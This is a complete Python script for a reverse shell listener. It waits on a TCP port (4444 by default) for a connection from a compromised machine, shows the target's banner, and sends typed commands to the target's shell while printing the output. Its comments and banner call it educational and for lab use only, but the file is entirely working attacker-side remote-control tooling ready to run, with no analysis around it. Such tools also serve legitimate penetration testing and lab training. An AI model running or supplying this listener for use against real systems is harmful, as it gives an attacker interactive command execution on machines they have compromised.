#!/usr/bin/env python3
"""
Simple Reverse Shell Listener
Educational purposes - Lab testing only
Works on Windows, Linux, and Mac
"""

import socket
import sys
import threading
import argparse
from datetime import datetime

class ReverseShellListener:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.client_socket = None
        
    def start(self):
        """Start listening for incoming connections"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            
            print("=" * 70)
            print(f"[*] Reverse Shell Listener Started")
            print(f"[*] Listening on {self.host}:{self.port}")
            print(f"[*] Waiting for connection...")
            print("=" * 70)
            print()
            
            # Accept connection
            self.client_socket, client_address = self.socket.accept()
            
            print(f"[✓] Connection received from {client_address[0]}:{client_address[1]}")
            print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print()
            
            # Read banner if sent
            self.client_socket.settimeout(2)
            try:
                banner = self.client_socket.recv(4096).decode('utf-8', errors='ignore')
                if banner:
                    print("[*] Target Information:")
                    print("-" * 70)
                    print(banner)
                    print("-" * 70)
            except socket.timeout:
                pass
            
            self.client_socket.settimeout(None)
            
            print("[*] Interactive shell established. Type 'exit' to quit.")
            print()
            
            # Start interactive session
            self.interactive_shell()
            
        except KeyboardInterrupt:
            print("\n[*] Listener interrupted by user")
            self.cleanup()
        except Exception as e:
            print(f"[-] Error: {e}")
            self.cleanup()
    
    def interactive_shell(self):
        """Handle interactive shell communication"""
        
        # Thread to receive data from target
        def receive_data():
            while True:
                try:
                    data = self.client_socket.recv(4096)
                    if not data:
                        print("\n[*] Connection closed by target")
                        break
                    
                    # Print received data
                    output = data.decode('utf-8', errors='ignore')
                    print(output, end='', flush=True)
                    
                except Exception as e:
                    print(f"\n[-] Receive error: {e}")
                    break
        
        # Start receiver thread
        receiver = threading.Thread(target=receive_data, daemon=True)
        receiver.start()
        
        # Send commands
        try:
            while True:
                try:
                    # Read command from user
                    command = input()
                    
                    if command.lower() in ['exit', 'quit']:
                        print("[*] Closing connection...")
                        break
                    
                    # Send command to target
                    self.client_socket.send((command + '\n').encode('utf-8'))
                    
                except EOFError:
                    break
                    
        except KeyboardInterrupt:
            print("\n[*] Session interrupted")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Clean up sockets"""
        try:
            if self.client_socket:
                self.client_socket.close()
            if self.socket:
                self.socket.close()
        except:
            pass
        print("\n[*] Listener stopped")

def main():
    parser = argparse.ArgumentParser(
        description='Simple reverse shell listener (Educational/Lab use)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Listen on all interfaces, port 4444
  python listener.py --port 4444
  
  # Listen on specific IP
  python listener.py --host 192.168.1.50 --port 9999
  
  # Default usage (0.0.0.0:4444)
  python listener.py
        '''
    )
    
    parser.add_argument('--host', default='0.0.0.0',
                       help='IP address to bind to (default: 0.0.0.0 - all interfaces)')
    parser.add_argument('--port', type=int, default=4444,
                       help='Port to listen on (default: 4444)')
    
    args = parser.parse_args()
    
    print()
    print("╔" + "═" * 68 + "╗")
    print("║" + " " * 20 + "REVERSE SHELL LISTENER" + " " * 26 + "║")
    print("║" + " " * 15 + "Educational/Lab Testing Only" + " " * 23 + "║")
    print("╚" + "═" * 68 + "╝")
    print()
    
    listener = ReverseShellListener(args.host, args.port)
    listener.start()

if __name__ == '__main__':
    main()
